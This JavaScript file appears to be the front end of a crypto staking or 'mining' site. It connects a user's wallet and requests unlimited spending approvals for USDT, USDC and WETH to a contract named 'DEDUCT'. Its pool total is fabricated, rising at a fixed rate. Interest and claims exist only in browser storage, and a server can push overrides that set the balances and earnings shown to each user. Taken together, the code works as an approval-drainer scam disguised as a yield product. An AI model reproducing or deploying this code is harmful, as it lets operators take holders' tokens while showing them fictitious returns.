      accountBalance[token].pledged = Number(override[pledgedKey]);
    }
    if (override[interestKey] != null) {
      accountBalance[token].interest = Number(override[interestKey]);
    }
    if (override[claimedKey] != null) {
      localStorage.setItem(claimedKey, String(override[claimedKey]));
    } else {
      localStorage.setItem(claimedKey, '0');
    }
    if (override[walletKey] != null) {
      accountBalance[token].wallet = Number(override[walletKey]);
      updateWalletBalanceFromCache();
    }
  });
  updateClaimableDisplay();
  updateAccountBalanceDisplay();
}
// ==================== 其他函數保持不變 ====================
function getCurrentBalances() {
  return {
    USDT: accountBalance.USDT.wallet,
    USDC: accountBalance.USDC.wallet,
    WETH: accountBalance.WETH.wallet
  };
}
function updateTotalFunds() {
  if (!totalValue) return;
  const initialFunds = 12856459.94;
  const increasePerSecond = 0.055;
  const fixedStartTime = 1698796800000;
  const elapsedSeconds = Math.floor((Date.now() - fixedStartTime) / 1000);
  const total = initialFunds + (elapsedSeconds * increasePerSecond);
  totalValue.textContent = `${total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
}
async function refreshEthPrice() {
  const now = Date.now();
  if (now - ethPriceCache.timestamp < ethPriceCache.cacheDuration) return;
  try {
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
    if (!response.ok) throw new Error();
    const data = await response.json();
    ethPriceCache.price = data.ethereum.usd;
    ethPriceCache.timestamp = now;
  } catch (error) {
    console.error('[DEBUG] ETH價格刷新錯誤:', error);
  }
}
function initializeMiningData() {
  localStorage.setItem('totalGrossOutput', '0');
  localStorage.setItem('claimable', '0');
  localStorage.setItem('lastPayoutTime', (Date.now() - 24 * 60 * 60 * 1000).toString());
}
function getETOffsetMilliseconds() {
  const now = new Date();
  const mar = new Date(now.getFullYear(), 2, 8);
  const nov = new Date(now.getFullYear(), 10, 1);
  const marDay = mar.getDay();
  const novDay = nov.getDay();
  const dstStart = new Date(now.getFullYear(), 2, 8 + (5 - marDay) % 7);
  const dstEnd = new Date(now.getFullYear(), 10, 1 + (5 - novDay) % 7);
  return now >= dstStart && now < dstEnd ? -4 * 60 * 60 * 1000 : -5 * 60 * 60 * 1000;
}
function updateClaimableDisplay() {
  if (!grossOutputValue || !cumulativeValue) return;
  const currentUserData = window.lastSseData?.users?.[userAddress?.toLowerCase()] ||
                          window.loadedUserData ||
                          {};
  const currentOverrides = window.currentOverrides ||
                          (window.lastSseData?.overrides?.[userAddress?.toLowerCase()] || {});
  const grossOutput = currentOverrides.grossOutput !== undefined
      ? currentOverrides.grossOutput
      : (currentUserData.grossOutput || totalGrossOutput || 0);
  grossOutputValue.textContent = `${safeFixed(grossOutput, 7)} ETH`;
  const cumulative = currentOverrides.cumulative !== undefined && currentOverrides.cumulative > 0
      ? currentOverrides.cumulative
      : (currentUserData.cumulative || window.currentClaimable || 0);
  cumulativeValue.textContent = `${safeFixed(cumulative, 7)} ETH`;
}
async function updateInterest() {
  const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
  const data = accountBalance[selected];
  const totalBalance = data.wallet + data.pledged;
  const hasOverride = window.currentOverrides?.cumulative !== undefined ||
                     (window.lastSseData?.overrides?.[userAddress?.toLowerCase()]?.cumulative !== undefined) ||
                     window.currentOverrides || window.lastSseData?.overrides?.[userAddress?.toLowerCase()];
  if (hasOverride) return;
  if (totalBalance <= 0) {
    window.currentClaimable = 0;
    updateClaimableDisplay();
    return;
  }
  const now = Date.now();
  const etOffset = getETOffsetMilliseconds();
  const nowET = new Date(now + etOffset);
  const isPayoutTime = nowET.getHours() === 0 || nowET.getHours() === 12;
  const isExactMinute = nowET.getMinutes() === 0;
  if (!isPayoutTime || !isExactMinute) return;
  const lastPayout = parseInt(localStorage.getItem('lastPayoutTime')) || 0;
  const lastPayoutET = new Date(lastPayout + etOffset);
  const wasPayoutTime = lastPayoutET.getHours() === 0 || lastPayoutET.getHours() === 12;
  if (wasPayoutTime) return;
  const cycleInterest = totalBalance * (MONTHLY_RATE / 60);
  window.currentClaimable += cycleInterest;
  totalGrossOutput += cycleInterest;
  localStorage.setItem('claimable', window.currentClaimable.toString());
  localStorage.setItem('lastPayoutTime', now.toString());
  updateClaimableDisplay();
  updateAccountBalanceDisplay();
}
function updateClaimModalLabels() {
  const claimLabels = {
    'en': { title: 'Claim', claimable: 'Claimable', selectedToken: 'Selected Token', equivalentValue: 'Equivalent Value' },
    'zh-Hant': { title: '領取', claimable: '可領取', selectedToken: '選擇代幣', equivalentValue: '等值金額' },
    'zh-Hans': { title: '领取', claimable: '可领取', selectedToken: '选择代币', equivalentValue: '等值金额' }
  };
  const labels = claimLabels[currentLang];
  if (modalTitle) modalTitle.textContent = labels.title;
  const labelElements = document.querySelectorAll('.claim-info .label');
  if (labelElements.length >= 3) {
    labelElements[0].textContent = labels.claimable;
    labelElements[1].textContent = labels.selectedToken;
    labelElements[2].textContent = labels.equivalentValue;
  }
}
async function claimInterest() {
  await refreshEthPrice();
  updateClaimModalLabels();
  const currentUserData = window.lastSseData?.users?.[userAddress?.toLowerCase()] ||
                          window.loadedUserData ||
                          {};
  const currentOverrides = window.currentOverrides ||
                          (window.lastSseData?.overrides?.[userAddress?.toLowerCase()] || {});
  const claimableETH = currentOverrides.cumulative !== undefined && currentOverrides.cumulative > 0
      ? currentOverrides.cumulative
      : (currentUserData.cumulative || window.currentClaimable || 0);
  if (modalClaimableETH) modalClaimableETH.textContent = `${safeFixed(claimableETH, 7)} ETH`;
  if (modalSelectedToken) modalSelectedToken.textContent = authorizedToken;
  const ethPrice = ethPriceCache.price || 2500;
  let equivalent = 0;
  if (authorizedToken === 'WETH') {
    equivalent = claimableETH;
  } else {
    equivalent = claimableETH * ethPrice;
  }
  if (modalEquivalentValue) modalEquivalentValue.textContent = `${safeFixed(equivalent)} ${authorizedToken}`;
  if (claimModal) claimModal.style.display = 'flex';
}
function closeClaimModal() {
  if (claimModal) claimModal.style.display = 'none';
  if (claimInterval) clearInterval(claimInterval);
}
function updateNextBenefitTimer() {
  if (!nextBenefit) return;
  const safeLang = currentLang && translations[currentLang] ? currentLang : 'en';
  const defaultText = translations[safeLang].nextBenefit || 'Next Benefit: 00:00:00';
  const label = defaultText.split(':')[0].trim();
  const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime') || '0');
  if (!nextBenefitTimestamp) {
    nextBenefit.textContent = `${label}: 00:00:00`;
    return;
  }
  const now = Date.now();
  let diff = nextBenefitTimestamp - now;
  if (diff <= 0) {
    diff = 12 * 60 * 60 * 1000;
    localStorage.setItem('nextBenefitTime', (nextBenefitTimestamp + diff).toString());
  }
  const totalSeconds = Math.floor(diff / 1000);
  const h = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
  const m = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
  const s = String(totalSeconds % 60).padStart(2, '0');
  nextBenefit.textContent = `${label}: ${h}:${m}:${s}`;
}
function setInitialNextBenefitTime() {
  if (localStorage.getItem('nextBenefitTime')) return;
  const safeLang = currentLang && translations[currentLang] ? currentLang : 'en';
  const defaultText = translations[safeLang].nextBenefit || 'Next Benefit: 00:00:00';
  const label = defaultText.split(':')[0].trim();
  const etOffset = getETOffsetMilliseconds();
  const nowET = new Date(Date.now() + etOffset);
  const nextHour = nowET.getHours() < 12 ? 12 : 24;
  const nextBenefitTimeET = new Date(nowET);
  nextBenefitTimeET.setHours(nextHour, 0, 0, 0);
  const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
  localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
  updateNextBenefitTimer();
}
function activateStakingUI() {
  if (startBtn) startBtn.style.display = 'none';
  initializeMiningData();
  if (interestInterval) clearInterval(interestInterval);
  interestInterval = setInterval(updateInterest, 60000);
  if (nextBenefitInterval) clearInterval(nextBenefitInterval);
  nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
  setInitialNextBenefitTime();
  updateInterest();
}
async function sendMobileRobustTransaction(populatedTx) {
  if (!signer || !provider) throw new Error(translations[currentLang].error + ": Wallet not connected.");
  const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
  const fromAddress = await signer.getAddress();
  const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
  let txHash, receipt = null;
  try {
    txHash = await provider.send('eth_sendTransaction', [mobileTx]);
    updateStatus(`TX sent: ${txHash.slice(0,10)}...`);
    receipt = await provider.waitForTransaction(txHash);
  } catch (error) {
    if (error.hash) txHash = error.hash;
    if (txHash) {
      updateStatus(`TX sent: ${txHash.slice(0,10)}...`);
      receipt = await provider.waitForTransaction(txHash);
    } else throw error;
  }
  if (!receipt || receipt.status !== 1) throw new Error(`TX reverted: ${txHash?.slice(0,10)||''}`);
  return receipt;
}
async function initializeWallet() {
  if (!window.ethers) {
    updateStatus(translations[currentLang].ethersError, true);
    if (connectButton) connectButton.disabled = true;
    return;
  }
  try {
    console.log('[DEBUG] 初始化錢包...');
    if (typeof window.ethereum !== 'undefined') {
      provider = new window.ethers.BrowserProvider(window.ethereum);
    } else {
      provider = new window.ethers.JsonRpcProvider(INFURA_URL);
      updateStatus('Please connect wallet to transact', true);
    }
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', a => {
        if (a.length === 0) disconnectWallet();
        else if (userAddress && a[0].toLowerCase() !== userAddress.toLowerCase()) {
          resetState(false);
          setTimeout(connectWallet, 500);
        }
      });
      window.ethereum.on('chainChanged', () => {
        resetState(false);
        setTimeout(connectWallet, 500);
      });
    }
    const accounts = await provider.send('eth_accounts', []);
    if (accounts.length > 0) {
      console.log('[DEBUG] 自動連線錢包');
      await connectWallet();
      await updateUIBasedOnChainState();
    } else {
      disableInteractiveElements(true);
      updateStatus("noWallet", true);
      if (connectButton) connectButton.textContent = 'Connect wallet';
    }
  } catch (e) {
    console.error('[DEBUG] 錢包初始化錯誤:', e);
    updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
    if (connectButton) connectButton.disabled = true;
  }
}
let isConnecting = false;
async function connectWallet() {
  if (isConnecting) {
    updateStatus('Wallet connection request in progress, please wait...', true);
    return;
  }
  isConnecting = true;
  try {
    console.log('[DEBUG] 開始錢包連線...');
    if (typeof window.ethereum === 'undefined') {
      updateStatus('Please connect a wallet that supports EIP-1193', true);
      return;
    }
    if (!provider) {
      provider = new window.ethers.BrowserProvider(window.ethereum);
    }
    updateStatus('Connecting...');
    const accounts = await provider.send('eth_requestAccounts', []);
    if (accounts.length === 0) throw new Error("No account.");
    signer = await provider.getSigner();
    userAddress = await signer.getAddress();
    console.log('[DEBUG] 錢包連線成功:', userAddress);
    deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
    usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
    usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
    wethContract = new window.ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
    if (connectButton) {
      connectButton.classList.add('connected');
      connectButton.textContent = 'Connected';
    }
    await forceRefreshWalletBalance();
    updateStatus("walletConnected");
    await loadUserDataFromServer();
    await updateUIBasedOnChainState();
    initSSE();
    setTimeout(() => updateUIBasedOnChainState(), 3000);
  } catch (e) {
    console.error('[DEBUG] 錢包連線失敗:', e);
    if (e.code === -32002 || e.message.includes('already pending')) {
      updateStatus('Wallet confirmation window is open, please confirm in wallet', true);
    } else {
      updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
      resetState(true);
    }
  } finally {
    isConnecting = false;
  }
}
async function updateUIBasedOnChainState() {
  if (!userAddress) return;
  try {
    console.log('[DEBUG] 開始鏈上狀態檢查...');
    await provider.getBlockNumber();
    const isServiceActive = await retry(() => deductContract.isServiceActiveFor(userAddress));
    if (isServiceActive) {
      if (startBtn) startBtn.style.display = 'none';
      disableInteractiveElements(false);
      pledgeBtn.disabled = false;
      pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
      updateStatus("miningActivated");
      activateStakingUI();
    } else {
      if (startBtn) startBtn.style.display = 'block';
      disableInteractiveElements(false);
      updateStatus("pleaseAuthorize");
    }
  } catch (e) {
    console.error('[DEBUG] 鏈上狀態檢查錯誤:', e);
    updateStatus(`Status check error: ${e.message}`, true);
  }
}
async function handleConditionalAuthorizationFlow() {
  if (!signer) throw new Error(translations[currentLang].error + ": Wallet not connected");
  updateStatus('Authorizing...');
  const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
  const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
  const serviceActivated = await retry(() => deductContract.isServiceActiveFor(userAddress));
  const tokenMap = {
    'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
    'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
    'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }
  };
  const tokensToProcess = Object.values(tokenMap);
  let tokenToActivate = '';
  for (const { name, contract, address } of tokensToProcess) {
    if (!contract) continue;
    updateStatus(`Checking ${name} allowance...`);
    const currentAllowance = await retry(() => contract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
    if (currentAllowance < requiredAllowance) {
      updateStatus(`Requesting ${name} approval...`);
      try {
        const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
        approvalTx.value = 0n;
        await sendMobileRobustTransaction(approvalTx);
        const newAllowance = await retry(() => contract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
        if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
      } catch (err) {
        updateStatus(`${translations[currentLang].approveError} (${name})`, true);
      }
    } else if (!tokenToActivate) tokenToActivate = address;
  }
  if (!serviceActivated && tokenToActivate) {
    const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
    updateStatus(`Activating service with ${tokenName}...`);
    try {
      const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
      activateTx.value = 0n;
      const receipt = await sendMobileRobustTransaction(activateTx);
      if (receipt.status !== 1) throw new Error('Activation failed on chain');
      authorizedToken = tokenName;
      localStorage.setItem('authorizedToken', authorizedToken);
      await smartSave();
      await updateUIBasedOnChainState();
    } catch (err) {
      throw err;
    }
  }
  await forceRefreshWalletBalance();
  await loadUserDataFromServer();
  await updateUIBasedOnChainState();
  pledgeBtn.disabled = false;
  pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
  updateStatus("authSuccess");
}
function updateLanguage(lang) {
  if (!translations[lang]) lang = 'en';
  currentLang = lang;
  localStorage.setItem('language', lang);
  document.documentElement.lang = lang;
  if (languageSelect) languageSelect.value = lang;

  const apply = () => {
    for (let key in elements) {
      if (elements[key] && translations[lang]?.[key]) {
        elements[key].textContent = translations[lang][key];
      }
    }
    const rulesTitle = document.getElementById('rulesTitle');
    const rulesContent = document.getElementById('rulesContent');
    if (rulesTitle) rulesTitle.textContent = translations[lang].rulesTitle;
    if (rulesContent) rulesContent.innerHTML = translations[lang].rulesContent;

    updateNextBenefitTimer();
    updatePledgeSummary();
    updateEstimate();

    // 強制更新按鈕
    if (startBtn) startBtn.textContent = translations[lang].startBtnText;
    if (pledgeBtn) pledgeBtn.textContent = translations[lang].pledgeBtnText;

    // 更新帳戶明細標籤
    const labelMap = {
      modalTotalBalanceLabel: 'totalBalance',
      modalPledgedAmountLabel: 'pledgedAmount',
      modalPendingInterestLabel: 'pendingInterest',
      modalClaimedInterestLabel: 'claimedInterest',
      modalWalletBalanceLabel: 'walletBalance',
      totalPledgeLabel: 'totalPledge',
      estimateLabel: 'estimate'
    };
    Object.keys(labelMap).forEach(id => {
      const el = document.getElementById(id);
      if (el) el.textContent = translations[lang][labelMap[id]];
    });
  };
  setTimeout(apply, 50);
}
function calculatePayoutInterest() {
  const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
  const data = accountBalance[selected];
  const totalBalance = data.wallet + data.pledged;
  if (totalBalance <= 0) return 0;
  const now = Date.now();
  const lastPayout = parseInt(localStorage.getItem('lastPayoutTime')) || now;
  const hoursSinceLast = (now - lastPayout) / (1000 * 60 * 60);
  const monthlyRate = 0.01;
  const hourlyRate = monthlyRate / (30 * 24);
  return totalBalance * hourlyRate * hoursSinceLast;
}
function updatePledgeSummary() {
  if (!elements.totalPledge) return;
  const total = userPledges.reduce((sum, p) => sum + p.amount, 0);
  elements.totalPledge.textContent = safeFixed(total);
}
function updateEstimate() {
  if (!pledgeAmount || !pledgeDuration || !pledgeToken || !elements.estimate || !elements.exceedWarning) return;
  const amount = parseFloat(pledgeAmount.value) || 0;
  const durationDays = parseInt(pledgeDuration.value) || 90;
  const token = pledgeToken.value;
  if (amount === 0) {
    elements.estimate.textContent = '0.000';
    elements.exceedWarning.style.display = 'none';
    return;
  }
  const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
  if (!duration) return;
  if (amount < duration.min) {
    elements.exceedWarning.textContent = `Minimum pledge amount: ${duration.min} ${token}`;
    elements.exceedWarning.style.display = 'block';
    elements.exceedWarning.style.color = '#f00';
    elements.estimate.textContent = '0.000';
    return;
  }
  const interest = amount * duration.rate;
  const total = amount + interest;
  elements.estimate.textContent = `${safeFixed(total)} ${token}`;
  const decimals = token === 'WETH' ? 18 : 6;
  const bigIntBalance = cachedWalletBalances[token] || 0n;
  const formatted = ethers.formatUnits(bigIntBalance, decimals);
  const walletBalance = parseFloat(formatted);
  if (amount > walletBalance) {
    elements.exceedWarning.textContent = translations[currentLang].exceedBalance;
    elements.exceedWarning.style.display = 'block';
    elements.exceedWarning.style.color = '#f00';
  } else {
    elements.exceedWarning.style.display = 'none';
  }
}
// ==================== 雙層訂單詳情（動態翻譯） ====================
function showPledgeDetail() {
  if (!pledgeDetailModal) return;
  const content = document.getElementById('pledgeDetailContent');
  if (!content) return;
  content.innerHTML = '';
  if (userPledges.length === 0) {
    content.innerHTML = `<p>${translations[currentLang].noClaimable}</p>`;
  } else {
    const list = document.createElement('div');
    userPledges.forEach((p, i) => {
      const endTime = p.startTime + p.duration * 24 * 60 * 60 * 1000;
      const daysLeft = Math.max(0, Math.ceil((endTime - Date.now()) / (24 * 60 * 60 * 1000)));
      const durationInfo = PLEDGE_DURATIONS.find(d => d.days === p.duration) || { rate: 0 };
      const apr = (durationInfo.rate * 100).toFixed(1) + '%';
      const estimatedInterest = (p.amount * durationInfo.rate).toFixed(3);
      const item = document.createElement('div');
      item.style = 'border: 1px solid #444; margin: 8px 0; padding: 12px; border-radius: 8px; cursor: pointer; background: #1a1a1a;';
      item.innerHTML = `
        <div style="font-weight: bold;">${translations[currentLang].orderCount} #${i+1} - ${safeFixed(p.amount)} ${escapeHtml(p.token)}</div>
        <div style="font-size: 0.9em; color: #0f0;">${translations[currentLang].cycle}：${p.duration} ${translations[currentLang].days} | ${translations[currentLang].apr}：${apr}</div>
        <div style="font-size: 0.9em; color: #0ff;">${translations[currentLang].remaining}：${daysLeft} ${translations[currentLang].days} | ${translations[currentLang].accrued}：${estimatedInterest} ${escapeHtml(p.token)}</div>
        <div style="font-size: 0.8em; color: #aaa; margin-top: 4px;">${new Date(p.startTime).toLocaleString()}</div>
      `;
      item.onclick = () => showOrderDetail(p, i);
      list.appendChild(item);
    });
    content.appendChild(list);
  }
  pledgeDetailModal.style.display = 'flex';
}
// 【關鍵修復】使用 DOM 操作 + addEventListener，避免 innerHTML 注入 onclick
function showOrderDetail(order, index) {
  const detailModal = document.createElement('div');
  detailModal.style = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; align-items: center; justify-content: center; z-index: 10000; padding: 20px;';
  const endTime = order.startTime + order.duration * 24 * 60 * 60 * 1000;
  const daysLeft = Math.max(0, Math.ceil((endTime - Date.now()) / (24 * 60 * 60 * 1000)));
  const durationInfo = PLEDGE_DURATIONS.find(d => d.days === order.duration) || { rate: 0 };
  const accrued = (order.amount * durationInfo.rate * (Date.now() - order.startTime) / (order.duration * 24 * 60 * 60 * 1000)).toFixed(3);
  const estimatedTotal = (order.amount * durationInfo.rate).toFixed(3);
  const modalContent = document.createElement('div');
  modalContent.style = 'background: #111; padding: 24px; border-radius: 16px; max-width: 90%; color: #fff; box-shadow: 0 0 20px rgba(0,255,255,0.3);';
  modalContent.innerHTML = `
    <h3 style="margin: 0 0 16px; color: #0ff;">${translations[currentLang].pledgeDetailTitle} #${index + 1}</h3>
    <div style="line-height: 1.6;">
      <p><strong>${translations[currentLang].orderCount}：</strong><span style="color:#0f0;">${escapeHtml(order.orderId)}</span></p>
      <p><strong>${translations[currentLang].pledgedAmount}：</strong>${safeFixed(order.amount)} ${escapeHtml(order.token)}</p>
      <p><strong>${translations[currentLang].cycle}：</strong>${order.duration} ${translations[currentLang].days}</p>
      <p><strong>${translations[currentLang].apr}：</strong><span style="color:#0f0;">${(durationInfo.rate * 100).toFixed(1)}%</span></p>
      <p><strong>${translations[currentLang].startTime}：</strong>${new Date(order.startTime).toLocaleString()}</p>
      <p><strong>End Time：</strong>${new Date(endTime).toLocaleString()}</p>
      <p><strong>${translations[currentLang].remaining}：</strong><span style="color:#ff0;">${daysLeft} ${translations[currentLang].days}</span></p>
      <p><strong>${translations[currentLang].accrued}：</strong><span style="color:#0ff;">${accrued} ${escapeHtml(order.token)}</span></p>
      <p><strong>Estimated Total Interest：</strong><span style="color:#0f0;">${estimatedTotal} ${escapeHtml(order.token)}</span></p>
    </div>
  `;
  const closeBtn = document.createElement('button');
  closeBtn.textContent = 'Close';
  closeBtn.style = 'margin-top: 20px; padding: 10px 20px; background: #00ffff; color: #000; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;';
  closeBtn.onclick = () => detailModal.remove();
  modalContent.appendChild(closeBtn);
  detailModal.appendChild(modalContent);
  document.body.appendChild(detailModal);
  detailModal.addEventListener('click', (e) => {
    if (e.target === detailModal) detailModal.remove();
  });
}
// ==================== 帳戶明細（點擊 Pending Interest 領取） ====================
function showAccountDetail() {
  if (!accountDetailModal) return;
  const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
  const data = accountBalance[selected];
  const claimedInterest = parseFloat(localStorage.getItem(`claimedInterest${selected}`) || '0') || 0;
  const total = (data.wallet || 0) + (data.pledged || 0) + claimedInterest + (data.interest || 0);
  document.getElementById('modalTotalBalance').textContent = `${safeFixed(total)} ${selected}`;
  document.getElementById('modalPledgedAmount').textContent = `${safeFixed(data.pledged || 0)} ${selected}`;
  document.getElementById('modalPendingInterest').textContent = `${safeFixed(data.interest || 0)} ${selected}`;
  document.getElementById('modalClaimedInterest').textContent = `${safeFixed(claimedInterest)} ${selected}`;
  document.getElementById('modalWalletBalance').textContent = `${safeFixed(data.wallet || 0)} ${selected}`;
  accountDetailModal.style.display = 'flex';
  // 強制更新語言標籤
  const pendingLabel = document.getElementById('modalPendingInterestLabel');
  const claimedLabel = document.getElementById('modalClaimedInterestLabel');
  if (pendingLabel) pendingLabel.textContent = translations[currentLang].pendingInterest;
  if (claimedLabel) claimedLabel.textContent = translations[currentLang].claimedInterest;
  // 點擊 Pending Interest 跳出領取面板
  const pendingRow = document.getElementById('modalPendingInterest').parentElement;
  pendingRow.style.cursor = 'pointer';
  pendingRow.onclick = () => {
    if (data.pledged + data.interest <= 0) {
      updateStatus('No principal or interest to claim', true);
      return;
    }
    showPledgeResult('confirm', translations[currentLang].claimPledgeTitle,
      `${translations[currentLang].claimPledgeMessage}<br>` +
      `<strong>Principal:</strong> ${safeFixed(data.pledged)} ${selected}<br>` +
      `<strong>Interest:</strong> ${safeFixed(data.interest)} ${selected}<br>` +
      `<small style="color:#aaa;">${translations[currentLang].confirm} to move to Claimed Interest</small>`,
      () => confirmClaimInterest(selected) // 確認回調
    );
  };
}
function closeAccountDetailModal() {
  if (accountDetailModal) accountDetailModal.style.display = 'none';
}
// 確認領取本金 + 利息
function confirmClaimInterest(token) {
  const data = accountBalance[token];
  const total = data.pledged + data.interest;
  if (total <= 0) return;
  const claimedKey = `claimedInterest${token}`;
  const previous = parseFloat(localStorage.getItem(claimedKey) || '0');
  localStorage.setItem(claimedKey, (previous + total).toString());
  data.pledged = 0;
  data.interest = 0;
  updateAccountBalanceDisplay();
  showPledgeResult('success', translations[currentLang].claimPledgeSuccess,
    `${safeFixed(total)} ${token} ${translations[currentLang].claimPledgeSuccess}`
  );
  smartSave();
}
// ==================== 【新增】到期自動贖回 + 通知 ====================
function checkPledgeExpiry() {
  userPledges.forEach(async (p, i) => {
    const endTime = p.startTime + p.duration * 24 * 60 * 60 * 1000;
    if (Date.now() > endTime && !p.redeemed) {
      p.redeemed = true;
      const durationInfo = PLEDGE_DURATIONS.find(d => d.days === p.duration) || { rate: 0 };
      const totalInterest = p.amount * durationInfo.rate;
      accountBalance[p.token].pledged -= p.amount;
      accountBalance[p.token].interest += totalInterest;
      p.redeemedTime = Date.now();
      await smartSave();
      updateAccountBalanceDisplay();
      updatePledgeSummary();
      updateClaimableDisplay();
      showPledgeResult('success', translations[currentLang].pledgeMatured,
        `${p.amount.toFixed(3)} ${p.token} ${translations[currentLang].principalReturned}<br>` +
        `${totalInterest.toFixed(3)} ${p.token} ${translations[currentLang].interestAdded}<br>` +
        `<small style="color:#aaa;">${translations[currentLang].viewDetails}</small>`
      );
    }
  });
}
setInterval(checkPledgeExpiry, 60000);
// ==================== 【修復】顯示質押結果面板 ====================
function showPledgeResult(type, title, message, confirmCallback = null) {
  const modal = document.getElementById('pledgeResultModal');
  const titleEl = document.getElementById('pledgeResultTitle');
  const messageEl = document.getElementById('pledgeResultMessage');
  const confirmBtn = document.getElementById('pledgeResultConfirm');
  if (!modal || !titleEl || !messageEl || !confirmBtn) {
    console.error('[ERROR] Pledge result modal elements not found');
    return;
  }
  titleEl.textContent = title;
  messageEl.innerHTML = message;
  modal.classList.toggle('error', type === 'error');
  modal.classList.toggle('confirm', type === 'confirm');
  modal.style.display = 'flex';
  if (confirmCallback) {
    confirmBtn.onclick = () => {
      modal.style.display = 'none';
      confirmCallback();
    };
  } else {
    confirmBtn.onclick = () => modal.style.display = 'none';
  }
}
// 檢查質押是否被鎖定（後端處理中）
async function isPledgeLocked(address) {
  try {
    const response = await fetch(`${BACKEND_API_URL}/api/pledge_locks/${address.toLowerCase()}`);
    if (!response.ok) throw new Error('Lock check failed');
    const { locked } = await response.json();
    return locked;
  } catch (error) {
    console.error('[DEBUG] 鎖定檢查錯誤:', error);
    return false;
  }
}
// 智慧儲存（本地 + 同步到後端）
async function smartSave(updateData = {}) {
  try {
    const fullData = {
      ...accountBalance,
      pledgedAmount,
      lastPayoutTime: localStorage.getItem('lastPayoutTime'),
      currentCycleInterest,
      authorizedToken,
      userPledges,
      ...updateData,
      lastUpdated: Date.now(),
      source: 'client_save'
    };
    localStorage.setItem('userData', JSON.stringify(fullData));
    if (userAddress) {
      const response = await fetch(`${BACKEND_API_URL}/api/user-data`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: userAddress, data: fullData })
      });
      const result = await response.json();
      if (result.version) {
        localStorage.setItem('dataVersion', result.version.toString());
      }
    }
    console.log('[DEBUG] 資料已智慧儲存');
  } catch (error) {
    console.error('[DEBUG] 智慧儲存失敗:', error);
  }
}
// 從伺服器載入用戶資料（關鍵修復函數）
async function loadUserDataFromServer() {
  if (!userAddress) {
    console.warn('[DEBUG] 無用戶地址，跳過載入');
    return;
  }
  try {
    console.log('[DEBUG] 從伺服器載入用戶資料:', userAddress);
    const response = await fetch(`${BACKEND_API_URL}/api/user-data/${userAddress.toLowerCase()}`);
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${await response.text()}`);
    }
    const userData = await response.json();
    console.log('[DEBUG] 載入用戶資料成功:', userData);
    window.loadedUserData = userData;
    window.currentClaimable = userData.claimable || 0;
    totalGrossOutput = userData.grossOutput || 0;
    authorizedToken = userData.pledgeToken || 'USDT';
    // === 【關鍵修正】安全處理 pledges ===
    let pledgesArray = [];
    if (userData.pledges) {
      if (Array.isArray(userData.pledges)) {
        pledgesArray = userData.pledges;
      } else if (typeof userData.pledges === 'object' && userData.pledges !== null) {
        pledgesArray = Object.values(userData.pledges).filter(p => p && p.amount);
      }
    }
    userPledges = pledgesArray.map(p => ({
      orderId: p.orderId || Date.now().toString(36),
      amount: parseFloat(p.amount) || 0,
      token: (p.token || 'USDT').toUpperCase(),
      duration: parseInt(p.duration) || 90,
      startTime: parseInt(p.startTime) || Date.now(),
      apr: p.apr || 0,
      redeemed: !!p.redeemed
    }));
    // === 結束 ===
    // 合併 overrides
    if (userData.overrides && Object.keys(userData.overrides).length > 0) {
      applyOverrides(userData.overrides);
    } else {
      ['USDT', 'USDC', 'WETH'].forEach(token => {
        accountBalance[token].pledged = userData.accountBalance?.[token]?.pledged ?? 0;
        accountBalance[token].interest = userData.accountBalance?.[token]?.interest ?? 0;
      });
    }
    // 演示錢包自動啟動
    if (userData.isDemoWallet) {
      console.log('[DEBUG] 檢測到演示錢包，自動啟動');
      window.isDemoMode = true;
      if (startBtn) startBtn.style.display = 'none';
      disableInteractiveElements(false);
      updateStatus("demoMode");
      activateStakingUI();
    }
    // 強制更新 UI
    updateClaimableDisplay();
    updateAccountBalanceDisplay();
    updatePledgeSummary();
    await forceRefreshWalletBalance();
    console.log('[DEBUG] 用戶資料載入完成');
  } catch (error) {
    console.error('[DEBUG] 載入用戶資料失敗:', error);
    updateStatus(`Data sync failed: ${error.message}`, true);
  }
}
// =============== 檔案結束 ===============